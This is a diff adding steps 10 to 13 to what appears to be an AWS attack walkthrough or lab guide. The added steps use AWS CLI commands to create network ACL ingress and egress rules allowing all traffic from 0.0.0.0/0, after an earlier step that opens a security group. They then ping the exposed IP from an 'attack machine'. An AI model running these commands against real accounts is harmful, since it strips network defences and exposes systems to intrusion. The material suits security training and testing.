@@ -53,3 +53,21 @@ AWS CLI or CloudShell
 ### 9) Create a security group rule to allow traffic from anywhere
 
     aws ec2 authorize-security-group-ingress  --protocol all --port 0-65535 --cidr 0.0.0.0/0 --group-id sg-TARGET_SECURITY_GROUP_ID
+
+### 10) Find the NACL ID of our target NACL
+
+    aws ec2 describe-network-acls > nacls.json
+
+### 11) Create an ingress rule in NACL
+
+    aws ec2 create-network-acl-entry --cidr-block 0.0.0.0/0 --ingress  --protocol -1 --rule-action allow --rule-number 1 --network-acl-id acl-NACL_ID
+
+### 12) Create an egress rule in NACL
+
+    aws ec2 create-network-acl-entry --cidr-block 0.0.0.0/0 --egress  --protocol -1 --rule-action allow --rule-number 1 --network-acl-id acl-NACL_ID
+
+### 13) Verify with ping
+
+Attack machine
+
+    ping EXPOSED_PUBLIC_IP
